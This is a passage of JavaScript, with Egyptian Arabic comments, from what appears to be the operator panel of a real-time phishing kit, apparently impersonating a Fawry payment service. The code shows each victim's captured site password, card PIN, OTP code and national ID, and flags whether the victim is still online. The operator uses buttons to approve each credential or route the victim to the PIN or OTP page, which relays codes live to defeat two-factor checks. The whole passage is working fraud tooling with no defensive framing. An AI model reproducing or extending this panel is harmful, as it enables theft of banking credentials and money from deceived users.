    content.querySelectorAll("[data-vis-msg-toggle]").forEach(function (b) {
      b.addEventListener("click", function () {
        var id = b.getAttribute("data-vis-msg-toggle");
        state.msgFor = state.msgFor === id ? null : id;
        renderVisitors();
      });
    });
    content.querySelectorAll("[data-vis-close-msg]").forEach(function (b) {
      b.addEventListener("click", function () { state.msgFor = null; renderVisitors(); });
    });
    content.querySelectorAll("[data-vis-send]").forEach(function (b) {
      b.addEventListener("click", function () {
        var ta = content.querySelector("[data-vis-msg]");
        if (!ta || !ta.value.trim()) { terr("اكتب رسالة أولًا"); return; }
        state.msgFor = null; renderVisitors();
        tsuc("تم إرسال الرسالة للزائر");
      });
    });
    content.querySelectorAll("[data-vis-redirect]").forEach(function (b) {
      b.addEventListener("click", function () {
        var url = window.prompt("أدخل الرابط لتوجيه الزائر إليه");
        if (url) tsuc("تم توجيه الزائر إلى " + url);
      });
    });
    content.querySelectorAll("[data-vis-block]").forEach(function (b) {
      b.addEventListener("click", function () {
        var id = b.getAttribute("data-vis-block");
        var arr = readBlocked(); if (arr.indexOf(id) === -1) arr.push(id);
        writeBlocked(arr); tsuc("تم حظر الزائر"); renderVisitors();
      });
    });
    content.querySelectorAll("[data-vis-unblock]").forEach(function (b) {
      b.addEventListener("click", function () {
        var id = b.getAttribute("data-vis-unblock");
        writeBlocked(readBlocked().filter(function (x) { return x !== id; }));
        tsuc("تم إلغاء الحظر"); renderVisitors();
      });
    });
    content.querySelectorAll("[data-vis-refresh]").forEach(function (b) {
      b.addEventListener("click", function () { tsuc("تم إرسال أمر تحديث"); });
    });
  }

  // العَلَم: هل العميل اللي عامل الطلب ده موجود في الموقع الآن؟
  function visitorOnline(o) {
    if (!o || !o.visitor_id) return false;
    var f = window.FW_VISITORS;
    if (!f || !f.list) return false;
    var vs = f.list();
    for (var i = 0; i < vs.length; i++) if (vs[i].id === o.visitor_id) return true;
    return false;
  }
  function presenceBadge(o) {
    // طلبات قديمة بدون visitor_id — مفيش طريقة نعرف زائرها → بدون علامة (أفضل من "خرج" المضلّل)
    if (!o || !o.visitor_id) return "";
    var on = visitorOnline(o);
    var dot = on ? "#059669" : "#94a3b8";
    var cls = on ? "bg-emerald-100 text-emerald-700" : "bg-muted text-muted-foreground";
    return '<span class="inline-flex items-center gap-1 rounded-full px-2 py-1 text-[10px] font-bold ' + cls + '">' +
      '<span class="h-2 w-2 rounded-full animate-pulse" style="background-color: ' + dot + '"></span>' +
      "<span>" + (on ? "في الموقع الآن" : "خرج من الموقع") + "</span></span>";
  }
  // مرحلة الطلب: أي إجراء متاح دلوقتي (بيانات دخول؟ رقم كارت؟ كود OTP؟)
  function ordStage(o) {
    var hasLogin = !!o.site_username;
    var hasPin = !!o.card_pin;
    var hasOtp = !!o.otp_code;
    if (hasOtp && (o.verification_status || "submitted") === "submitted") return "otp"; // كود ببانتظار التأكيد
    if (hasPin && (o.status || "") === "pin_submitted") return "pin"; // رقم كارت بانتظار التأكيد
    if (hasLogin && (o.login_status || "awaiting_review") === "awaiting_review") return "login"; // بيانات دخول بانتظار القبول
    // الكارت اتقبل — العميل في الـ OTP، مفيش أزرار
    if (hasPin && ((o.status || "") === "approved")) return "none";
    // بيانات الدخول مقبولة والأدمن بيختار / بيبدّل مسار العميل (OTP أو PIN)
    if (hasLogin && (o.login_status || "approved") === "approved" && ((o.status || "") === "approved" || (o.status || "") === "otp_direct" || (o.status || "") === "pin_direct")) return "routable";
    if ((o.status || "awaiting_review") === "awaiting_review") return "plain"; // طلب جديد لسه مفيش بيانات دخول
    return "none";
  }
  function routableBtns(o, id, small) {
    var h = small ? "h-8" : "h-11";
    var px = small ? " px-2.5 text-[11px]" : " text-[13px]";
    return '<button type="button" data-ord-otp="' + esc(id) + '" class="flex ' + h + ' items-center justify-center gap-1 rounded-lg' + px + ' font-extrabold text-white bg-blue-600 hover:brightness-110">' + ic(P_shieldAlert, "h-3.5 w-3.5") + "<span>تحويل OTP</span></button>" +
      '<button type="button" data-ord-pin="' + esc(id) + '" class="flex ' + h + ' items-center justify-center gap-1 rounded-lg' + px + ' font-extrabold text-white bg-amber-600 hover:brightness-110" style="background-color: #B45309;">' + ic(P_keyRound, "h-3.5 w-3.5") + "<span>تحويل PIN</span></button>";
  }
  function ordRowActions(o, id) {
    var st = ordStage(o);
    if (st === "otp") {
      // العميل أدخل الكود: قبول الكود / رفض الكود / تحويل PIN (يرجّعه لصفحة الكارت)
      return '<div class="flex flex-wrap items-center justify-end gap-1.5">' +
        '<button type="button" data-ord-approve="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_check, "h-3.5 w-3.5") + "<span>1 قبول الكود</span></button>" +
        '<button type="button" data-ord-reject="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-destructive px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_x, "h-3.5 w-3.5") + "<span>2 رفض الكود</span></button>" +
        '<button type="button" data-ord-pin="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-amber-700 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_keyRound, "h-3.5 w-3.5") + "<span>3 تحويل PIN</span></button>" +
        "</div>";
    }
    if (st === "pin") {
      // العميل أدخل رقم الكارت: قبول الكارت / رفض الكارت / تحويل OTP
      return '<div class="flex flex-wrap items-center justify-end gap-1.5">' +
        '<button type="button" data-ord-approve="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_check, "h-3.5 w-3.5") + "<span>1 قبول الكارت</span></button>" +
        '<button type="button" data-ord-reject="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-destructive px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_x, "h-3.5 w-3.5") + "<span>2 رفض الكارت</span></button>" +
        '<button type="button" data-ord-otp="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-blue-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_shieldAlert, "h-3.5 w-3.5") + "<span>3 تحويل OTP</span></button>" +
        "</div>";
    }
    if (st === "routable") {
      return '<div class="flex flex-wrap items-center justify-end gap-1.5">' +
        '<button type="button" data-ord-approve="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_check, "h-3.5 w-3.5") + "<span>1 قبول</span></button>" +
        '<button type="button" data-ord-otp="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-blue-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_shieldAlert, "h-3.5 w-3.5") + "<span>2 تحويل OTP</span></button>" +
        '<button type="button" data-ord-pin="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-amber-700 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_keyRound, "h-3.5 w-3.5") + "<span>3 تحويل PIN</span></button>" +
        "</div>";
    }
    if (st === "pinwait") return '<span class="text-[11px] text-muted-foreground">بانتظار رقم الكارت من العميل…</span>';
    if (st === "login") {
      return '<div class="flex flex-wrap items-center justify-end gap-1.5">' +
        '<button type="button" data-ord-approve="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_check, "h-3.5 w-3.5") + "<span>1 قبول</span></button>" +
        '<button type="button" data-ord-reject="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-destructive px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_x, "h-3.5 w-3.5") + "<span>2 رفض</span></button>" +
        '<button type="button" data-ord-otp="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-blue-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110">' + ic(P_shieldAlert, "h-3.5 w-3.5") + "<span>3 تحويل OTP</span></button>" +
        '<button type="button" data-ord-pin="' + esc(id) + '" class="flex h-8 items-center gap-1 rounded-lg bg-amber-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110" style="background-color: #B45309;">' + ic(P_keyRound, "h-3.5 w-3.5") + "<span>4 تحويل PIN</span></button>" +
        "</div>";
    }
    if (st === "plain") return '<span class="text-[11px] text-muted-foreground">بانتظار بيانات العميل…</span>';
    return '<span class="text-[11px] text-muted-foreground">—</span>';
  }
  function orderTitle(o) {
    return (o.status || "awaiting_review") === "awaiting_review"
      ? "طلب جديد من " + (o.name || "عميل")
      : (o.name || "عميل");
  }
  function renderOrders() {
    var orders = readOrders();
    // الترقيم بالترتيب القديم (الأقدم #1 — الترقيم ميتغيرش)
    var asc = orders.slice().sort(function (a, b) { return String(a.at || "").localeCompare(String(b.at || "")); });
    var num = {}; asc.forEach(function (o, i) { num[o.id || o.at] = i + 1; });
    // والعرض: الأحدث فوق
    var sorted = asc.slice().reverse();
    var pend = pendingCount(orders);
    var customers = new Set(orders.map(function (o) { return o.phone || o.nationalId || o.name; })).size;

    var tableRows = "";
    if (sorted.length === 0) {
      tableRows = '<tr><td colspan="9" class="px-3 py-10 text-center text-muted-foreground">لا توجد بيانات بعد.</td></tr>';
    }
    sorted.forEach(function (o) {
      var id = o.id || (o.at + "-" + num[o.id || o.at]);
      var actions = ordRowActions(o, id);
      tableRows += '<tr data-ord-row="' + esc(id) + '" class="cursor-pointer transition-colors hover:bg-muted/40">' +
        '<td class="px-3 py-3 font-bold text-brand-blue">طلب #' + (num[o.id || o.at] || "—") + "</td>" +
        '<td class="px-3 py-3"><div>' + esc(orderTitle(o)) + '</div><div class="mt-1">' + presenceBadge(o) + "</div></td>" +
        '<td class="px-3 py-3" dir="ltr">' + esc(o.phone || "—") + "</td>" +
        '<td class="px-3 py-3">' + esc(o.modelName || o.model || "—") + "</td>" +
        '<td class="px-3 py-3">' + esc(o.gov || "—") + "</td>" +
        '<td class="px-3 py-3">' + chipOf(o) + "</td>" +
        '<td class="px-3 py-3">' + actions + "</td>" +
        '<td class="px-3 py-3 text-muted-foreground whitespace-nowrap">' + fmtDate(o.at) + "</td>" +
        '<td class="px-3 py-3"><button type="button" data-ord-del="' + esc(id) + '" aria-label="حذف" class="grid h-8 w-8 place-items-center rounded-lg text-destructive hover:bg-destructive/10">' + ic(P_trash, "h-4 w-4") + "</button></td>" +
      "</tr>";
    });

    var mobCards = "";
    if (sorted.length === 0) {
      mobCards = '<div class="rounded-2xl bg-white p-8 text-center text-[13px] text-muted-foreground shadow-card">لا توجد بيانات بعد.</div>';
    }
    sorted.forEach(function (o) {
      var id = o.id || (o.at + "-" + num[o.id || o.at]);
      mobCards += '<div class="rounded-2xl bg-white p-4 shadow-card active:scale-[0.99] transition-transform" role="button" tabindex="0" data-ord-row="' + esc(id) + '">' +
        '<div class="flex w-full items-start justify-between gap-3 text-right">' +
          '<div class="min-w-0 flex-1">' +
            '<div class="text-[11px] font-bold text-muted-foreground">طلب #' + (num[o.id || o.at] || "—") + "</div>" +
            '<div class="mt-0.5 truncate text-[14px] font-extrabold text-brand-blue">' + esc(orderTitle(o)) + "</div>" +
            '<div class="mt-0.5 truncate text-[12px] text-muted-foreground" dir="ltr">' + esc(o.phone || "—") + "</div>" +
            '<div class="mt-2">' + presenceBadge(o) + "</div>" +
          "</div>" +
        "</div>" +
        '<div class="mt-3 flex items-center justify-between gap-2">' + chipOf(o, "inline-flex items-center gap-1 rounded-full px-2 py-1 text-[10.5px] font-bold") +
          '<span class="text-[10.5px] text-muted-foreground">' + fmtDate(o.at) + "</span>" +
        "</div></div>";
    });

    content.innerHTML =
      '<div class="grid grid-cols-2 gap-3 sm:gap-4">' +
        statCard("إجمالي الطلبات", String(orders.length), P_fileText, "blue") +
        statCard("عدد العملاء", String(customers), P_users, "violet") +
      "</div>" +
      '<div class="flex justify-center rounded-2xl bg-white p-4 shadow-card">' +
        '<button type="button" data-ord-clearall ' + (orders.length === 0 ? "disabled" : "") + ' class="flex h-11 items-center justify-center gap-2 rounded-[10px] border border-destructive/30 bg-white px-4 text-[12.5px] font-bold text-destructive hover:bg-destructive/5 disabled:opacity-40">' +
          ic(P_trash, "h-4 w-4") + "<span>حذف الكل</span></button>" +
      "</div>" +
      '<div class="hidden overflow-hidden rounded-2xl bg-white shadow-card md:block"><div class="overflow-x-auto">' +
        '<table class="w-full text-right text-[13px]">' +
          '<thead class="bg-brand-blue/5 text-brand-blue"><tr>' +
            ["رقم الطلب", "العميل", "الجوال", "الموديل", "المحافظة", "الحالة", "إجراء", "التاريخ", ""].map(function (h) {
              return '<th class="px-3 py-3 font-extrabold">' + h + "</th>";
            }).join("") +
          "</tr></thead>" +
          '<tbody class="divide-y divide-border">' + tableRows + "</tbody>" +
        "</table></div></div>" +
      '<div class="space-y-3 md:hidden">' + mobCards + "</div>";
    bindOrderActions();
  }

  // ---------- درَور تفاصيل الطلب (مطابق للأصل: تابات + صناديق بيانات + أزرار) ----------
  var P_circleCheck = '<circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path>';
  var P_circleX = '<circle cx="12" cy="12" r="10"></circle><path d="m15 9-6 6"></path><path d="m9 9 6 6"></path>';
  function pillShort(status) {
    return {
      awaiting_review: { text: "بانتظار", cls: "bg-amber-100 text-amber-700" },
      bank_approval: { text: "بانتظار", cls: "bg-blue-100 text-blue-700" },
      approved: { text: "مقبول", cls: "bg-blue-100 text-blue-700" },
      rejected: { text: "مرفوض", cls: "bg-red-100 text-red-700" },
      completed: { text: "مكتمل", cls: "bg-emerald-100 text-emerald-700" }
    }[status] || { text: "بانتظار", cls: "bg-amber-100 text-amber-700" };
  }
  function infoBox(label, value, mono, ltr) {
    return '<div class="rounded-xl bg-muted/50 p-3"><div class="text-[11px] font-bold text-muted-foreground">' + esc(label) + "</div>" +
      '<div class="mt-0.5 ' + (mono ? "font-mono text-[14px]" : "text-[14px]") + ' font-extrabold text-brand-blue"' + (ltr ? ' dir="ltr"' : "") + ">" + esc(value) + "</div></div>";
  }
  function drawerTabBtn(key, icon, label, st) {
    return '<button type="button" data-dtab="' + key + '" class="flex flex-col items-center gap-1 rounded-xl px-2 py-2 text-[11.5px] font-extrabold transition-all">' +
      ic(icon, "h-4 w-4") + "<span>" + label + "</span>" +
      '<span class="mt-0.5 rounded-full px-1.5 py-0.5 text-[9.5px] ' + st.cls + '">' + st.text + "</span></button>";
  }
  function drawerBody(o) {
    var st = pillShort(o.status || "awaiting_review");
    var stage = ordStage(o);
    var actions;
    if (stage === "otp") {
      actions = '<div class="flex gap-2 pt-1">' +
        '<button type="button" data-ord-approve="' + esc(o._key) + '" class="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-emerald-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50">' + ic(P_check, "h-4 w-4") + " قبول الكود</button>" +
        '<button type="button" data-ord-reject="' + esc(o._key) + '" class="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-destructive text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50">' + ic(P_circleX, "h-4 w-4") + " رفض الكود</button>" +
        "</div>" +
        '<button type="button" data-ord-pin="' + esc(o._key) + '" class="mt-2 flex h-11 w-full items-center justify-center gap-1.5 rounded-xl bg-amber-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]" style="background-color: #B45309;">' + ic(P_keyRound, "h-4 w-4") + " تحويل PIN</button>";
    } else if (stage === "pin") {
      actions = '<div class="flex gap-2 pt-1">' +
        '<button type="button" data-ord-approve="' + esc(o._key) + '" class="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-emerald-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50">' + ic(P_check, "h-4 w-4") + " قبول الكارت</button>" +
        '<button type="button" data-ord-reject="' + esc(o._key) + '" class="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-destructive text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50">' + ic(P_circleX, "h-4 w-4") + " رفض الكارت</button>" +
        "</div>" +
        '<button type="button" data-ord-otp="' + esc(o._key) + '" class="mt-2 flex h-11 w-full items-center justify-center gap-1.5 rounded-xl bg-blue-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]">' + ic(P_shieldAlert, "h-4 w-4") + " تحويل OTP</button>";
    } else if (stage === "routable") {
      actions = '<div class="flex gap-2 pt-1">' +
        '<button type="button" data-ord-approve="' + esc(o._key) + '" class="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-emerald-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50">' + ic(P_check, "h-4 w-4") + " قبول</button>" +
        '<button type="button" data-ord-otp="' + esc(o._key) + '" class="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-blue-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]">' + ic(P_shieldAlert, "h-4 w-4") + " تحويل OTP</button>" +
        "</div>" +
        '<button type="button" data-ord-pin="' + esc(o._key) + '" class="mt-2 flex h-11 w-full items-center justify-center gap-1.5 rounded-xl bg-amber-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]" style="background-color: #B45309;">' + ic(P_keyRound, "h-4 w-4") + " تحويل PIN</button>";
    } else if (stage === "login") {
      actions = '<div class="flex gap-2 pt-1">' +
        '<button type="button" data-ord-approve="' + esc(o._key) + '" class="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-emerald-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50">' + ic(P_check, "h-4 w-4") + " قبول</button>" +
        '<button type="button" data-ord-reject="' + esc(o._key) + '" class="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-destructive text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98] disabled:opacity-50">' + ic(P_circleX, "h-4 w-4") + " رفض</button>" +
        "</div>" +
        '<div class="mt-2 grid grid-cols-2 gap-2">' +
          '<button type="button" data-ord-otp="' + esc(o._key) + '" class="flex h-11 items-center justify-center gap-1.5 rounded-xl bg-blue-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]">' + ic(P_shieldAlert, "h-4 w-4") + " تحويل OTP</button>" +
          '<button type="button" data-ord-pin="' + esc(o._key) + '" class="flex h-11 items-center justify-center gap-1.5 rounded-xl bg-amber-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]" style="background-color: #B45309;">' + ic(P_keyRound, "h-4 w-4") + " تحويل PIN</button>" +
        "</div>";
    } else if (stage === "plain") {
      // طلب جديد لسه مفيهوش بيانات دخول — مفيش أزرار تحويل هنا
      actions = '<div class="flex justify-center pt-1"><span class="rounded-full bg-amber-50 px-3 py-1.5 text-[12px] font-bold text-amber-700">بانتظار بيانات العميل…</span></div>';
    } else {
      actions = '<div class="flex justify-center pt-1">' + chipOf(o, "inline-flex items-center gap-1 rounded-full px-3 py-1.5 text-[12px] font-bold") + "</div>";
    }
    // صناديق بيانات الدخول + كود التحقق (تظهر لما العميل يبعتها)
    var loginBoxes = "";
    if (o.site_username) {
      var lst = (o.login_status || "awaiting_review") === "approved" ? { text: "مقبول", cls: "bg-blue-100 text-blue-700" }
        : (o.login_status || "") === "rejected" ? { text: "مرفوض", cls: "bg-red-100 text-red-700" }
        : { text: "بانتظار", cls: "bg-amber-100 text-amber-700" };
      loginBoxes =
        '<div class="mt-3 rounded-xl border border-border/60 p-2.5 bg-muted/20">' +
          '<div class="mb-2 flex items-center justify-between"><span class="text-[11.5px] font-extrabold text-foreground">بيانات الدخول</span>' +
          '<span class="rounded-full px-2 py-0.5 text-[9.5px] font-bold ' + lst.cls + '">' + lst.text + "</span></div>" +
          '<div class="grid gap-2">' +
            infoBox("اسم المستخدم", o.site_username || "—", true, true) +
            infoBox("كلمة السر", o.site_password || "—", true, true) +
          "</div>" +
        "</div>";
    }
    var pinBoxes = "";
    if (o.card_pin) {
      var pst = (o.status === "pin_rejected") ? { text: "مرفوض", cls: "bg-red-100 text-red-700" }
        : (o.status === "pin_submitted") ? { text: "بانتظار", cls: "bg-amber-100 text-amber-700" }
        : { text: "مقبول", cls: "bg-blue-100 text-blue-700" };
      pinBoxes =
        '<div class="mt-3 rounded-xl border border-border/60 p-2.5 bg-muted/20">' +
          '<div class="mb-2 flex items-center justify-between"><span class="text-[11.5px] font-extrabold text-foreground">الرقم السري للكارت الأصفر</span>' +
          '<span class="rounded-full px-2 py-0.5 text-[9.5px] font-bold ' + pst.cls + '">' + pst.text + "</span></div>" +
          '<div class="grid gap-2">' +
            infoBox("الرقم", o.card_pin, true, true) +
          "</div>" +
        "</div>";
    }
    var otpBoxes = "";
    if (o.otp_code) {
      var vst = (o.verification_status === "approved" || o.status === "completed") ? { text: "مقبول", cls: "bg-blue-100 text-blue-700" }
        : (o.verification_status === "rejected" || o.status === "otp_rejected") ? { text: "مرفوض", cls: "bg-red-100 text-red-700" }
        : { text: "بانتظار", cls: "bg-amber-100 text-amber-700" };
      otpBoxes =
        '<div class="mt-3 rounded-xl border border-border/60 p-2.5 bg-muted/20">' +
          '<div class="mb-2 flex items-center justify-between"><span class="text-[11.5px] font-extrabold text-foreground">كود التحقق</span>' +
          '<span class="rounded-full px-2 py-0.5 text-[9.5px] font-bold ' + vst.cls + '">' + vst.text + "</span></div>" +
          '<div class="grid gap-2">' +
            infoBox("الكود", o.otp_code, true, true) +
          "</div>" +
        "</div>";
    }
    return '<div class="space-y-4 p-4 sm:p-5">' +
      // كارت التابات
      '<div class="overflow-hidden rounded-2xl border border-border bg-white shadow-sm">' +
        '<div class="grid grid-cols-2 gap-1 border-b border-border bg-muted/40 p-1">' +
          drawerTabBtn("order", P_keyRound, "بيانات الطلب", st) +
          drawerTabBtn("ship", P_pin, "بيانات التوصيل", st) +
        "</div>" +
        '<div class="space-y-3 p-4">' +
          '<div data-dpanel="order" class="grid grid-cols-1 gap-2">' +
            infoBox("الموديل", o.modelName || o.model || "—", false, false) +
            infoBox("وقت الطلب", fmtDate(o.at), false, false) +
            loginBoxes +
            pinBoxes +
            otpBoxes +
          "</div>" +
          '<div data-dpanel="ship" class="hidden grid grid-cols-1 gap-2">' +
            infoBox("الرقم القومي", o.nationalId || "—", true, true) +
            infoBox("المحافظة", o.gov || "—", false, false) +
            infoBox("العنوان", o.address || "—", false, false) +
          "</div>" +
          actions +
        "</div>" +
      "</div>" +
      // بيانات العميل
      '<div class="overflow-hidden rounded-2xl border border-border bg-white shadow-sm">' +
        '<div class="border-b border-border bg-muted/40 px-4 py-2.5 text-[12.5px] font-extrabold text-foreground">بيانات العميل</div>' +
        '<div class="grid grid-cols-1 gap-2 p-3 sm:grid-cols-2">' +
          infoBox("الاسم", o.name || "—", false, false) +
          infoBox("رقم الهاتف", o.phone || "—", true, true) +
          infoBox("المحافظة", o.gov || "—", false, false) +
          infoBox("العنوان", o.address || "—", false, false) +
        "</div>" +
      "</div>" +
      '<button type="button" data-ord-del="' + esc(o._key) + '" class="mt-2 flex h-11 w-full items-center justify-center gap-2 rounded-xl border border-destructive/40 bg-white text-[13px] font-bold text-destructive hover:bg-destructive/5">' +
        ic(P_trash, "h-4 w-4") + "<span>حذف هذا الطلب</span></button>" +
      "</div>";
  }
  // بصمة بيانات الطلب (من غير المفتاح الداخلي _key) — عشان نعرف لو الدرَور المفتوح اعتدل ل.s داده جديدة أو لا
  function ordSig(o) {
    var c = Object.assign({}, o);
    delete c._key;
    return JSON.stringify(c);
  }
  function openDrawer(id, silent, startTab) {
    var orders = readOrders();
    var sorted = orders.slice().sort(function (a, b) { return String(a.at || "").localeCompare(String(b.at || "")); });
    var o = null;
    for (var i = 0; i < sorted.length; i++) {
      var key = sorted[i].id || (sorted[i].at + "-" + (i + 1));
      if (key === id) { o = Object.assign({}, sorted[i], { _key: key }); break; }
    }
    if (!o) return;
    closeDrawer();
    state.drawerId = id;
    state.drawerSig = ordSig(sorted[i]);
    if (silent) {
      state.drawerTab = startTab || state.drawerTab || "order";
    } else {
      state.drawerTab = "order";
    }
    var activeTab = state.drawerTab || "order";
    var d = document.createElement("div");
    d.id = "adm-drawer";
    d.className = "fixed inset-0 z-50 flex items-stretch justify-start bg-black/50 backdrop-blur-sm";
    var asideCls = "ms-auto h-full w-full max-w-full overflow-y-auto bg-[hsl(210_40%_97%)] shadow-2xl sm:max-w-[480px]";
    d.innerHTML =
      '<aside dir="rtl" class="' + asideCls + '">' +
        '<div class="sticky top-0 z-10 border-b border-border bg-gradient-to-br from-brand-blue to-[hsl(214_70%_30%)] px-4 py-4 text-white sm:px-5">' +
          '<div class="flex items-center justify-between gap-3">' +
            '<div class="min-w-0"><h2 class="truncate text-[15px] font-extrabold sm:text-[17px]">تفاصيل الطلب</h2>' +
            '<div class="mt-0.5 truncate font-mono text-[11px] text-white/80">' + esc(id) + "</div>" +
            '<div class="mt-1 flex ' + (visitorOnline(o) ? "" : "") + '">' + presenceBadge(o).replace("bg-muted text-muted-foreground", "bg-white/15 text-white/85") + "</div></div>" +
            '<button type="button" id="adm-drawer-close" class="grid h-9 w-9 shrink-0 place-items-center rounded-lg bg-white/15 text-white hover:bg-white/25" aria-label="إغلاق">' + ic(P_x, "h-5 w-5") + "</button>" +
          "</div>" +
        "</div>" + drawerBody(o) +
      "</aside>";
    document.body.appendChild(d);
    d.addEventListener("click", function (e) { if (e.target === d) closeDrawer(); });
    d.querySelector("#adm-drawer-close").addEventListener("click", closeDrawer);
    // تبويبات الدرَور
    function setDrawerTab(key) {
      state.drawerTab = key;
      d.querySelectorAll("[data-dtab]").forEach(function (b) {
        var on = b.getAttribute("data-dtab") === key;
        b.className = "flex flex-col items-center gap-1 rounded-xl px-2 py-2 text-[11.5px] font-extrabold transition-all " +
          (on ? "bg-white text-brand-blue shadow-sm" : "text-muted-foreground hover:text-brand-blue");
      });
      d.querySelectorAll("[data-dpanel]").forEach(function (p) {
        var on = p.getAttribute("data-dpanel") === key;
        p.className = on ? "grid grid-cols-1 gap-2" : "hidden";
      });
    }
    setDrawerTab(activeTab);
    d.querySelectorAll("[data-dtab]").forEach(function (b) {
      b.addEventListener("click", function () { setDrawerTab(b.getAttribute("data-dtab")); });
    });
    // أزرار الإجراءات
    d.querySelectorAll("[data-ord-approve],[data-ord-bank],[data-ord-reject],[data-ord-otp],[data-ord-pin]").forEach(function (b) {
      var a = b.getAttribute("data-ord-approve") ? ["approve", b.getAttribute("data-ord-approve")]
        : b.getAttribute("data-ord-bank") ? ["bank", b.getAttribute("data-ord-bank")]
        : b.getAttribute("data-ord-otp") ? ["route-otp", b.getAttribute("data-ord-otp")]
        : b.getAttribute("data-ord-pin") ? ["route-pin", b.getAttribute("data-ord-pin")]
        : ["reject", b.getAttribute("data-ord-reject")];
      b.addEventListener("click", function () {
        act(a[0], a[1]);
        state.drawerId = a[1];
        openDrawer(a[1]); // افتح الدرَور بنفس الطلب بالحالة الجديدة
      });
    });
    var del = d.querySelector("[data-ord-del]");
    if (del) del.addEventListener("click", function () { act("del", del.getAttribute("data-ord-del")); });
  }
  function closeDrawer() {
    state.drawerId = null;
    state.drawerSig = null;
    var d = document.getElementById("adm-drawer");
    if (d && d.parentNode) d.parentNode.removeChild(d);
  }
  function closeDrawerStale() {
    // لو الدرَور اتشال من DOM بره السيطرة، صفّر الحالة
    if (state.drawerId && !document.getElementById("adm-drawer")) state.drawerId = null;
  }

  function act(kind, id) {
    var db = window.FAWRY_DB;
    if (db && db.list) {
      // "حذف الكل" مالوش id — لازم يتراهن قبل فحص find() عشان متتمنعش
      if (kind === "clearall") {
        var pin0 = window.prompt("أدخل Pin لتأكيد حذف جميع الطلبات");
        if (pin0 === null) return;
        _hash(pin0.trim()).then(function(h) {
          if (h !== _H2) { terr("رمز Pin غير صحيح"); return; }
          if (window.confirm("هل أنت متأكد من حذف جميع الطلبات؟")) {
            db.clearAll(); tsuc("تم حذف جميع الطلبات");
          }
          refresh(true);
        });
        return;
      }
      var app = db.find(id);
      if (!app) { terr("الطلب مش موجود"); return; }
      if (kind === "del") {
        db.remove(id);
        tsuc("تم حذف الطلب");
      } else if (kind === "approve") {
        if (app.otp_code && app.verification_status === "submitted") {
          db.update(id, { verification_status: "approved", review_status: "completed" });
          tsuc("تم تأكيد OTP — اكتملت العملية");
        } else if (app.card_pin && app.review_status === "pin_submitted") {
          db.update(id, { login_status: "approved", review_status: "approved" });
          tsuc("تم قبول رقم الكارت — العميل سينتقل لإدخال OTP");
        } else if (app.site_username && app.login_status !== "approved") {
          db.update(id, { login_status: "approved", review_status: "approved" });
          tsuc("تم قبول العملية — العميل سينتقل لإدخال رقم الكارت");
        } else {
          db.update(id, { login_status: "approved", review_status: "approved" });
          tsuc("تم قبول العملية ✓");
        }
      } else if (kind === "route-otp") {
        // الأدمن اختار يودّي العميل لصفحة الـ OTP مباشرة ("otp_direct" — قيمة review_status)
        db.update(id, { login_status: "approved", review_status: "otp_direct" });
        tsuc("تم تحويل العميل لإدخال OTP");
      } else if (kind === "route-pin") {
        // الأدمن اختار يودّي العميل لصفحة الرقم السري للكارت مباشرة (وممكن من صفحة الكود — نمسح الكود القديم)
        db.update(id, { login_status: "approved", review_status: "pin_direct", otp_code: "", verification_status: "awaiting" });
        tsuc("تم تحويل العميل لإدخال رقم الكارت");
      } else if (kind === "bank") {
        db.update(id, { review_status: "bank_approval" });
        tsuc("تم إرسال طلب الموافقة إلى تطبيق البنك");
      } else if (kind === "reject") {
        if (app.otp_code && app.verification_status === "submitted") {
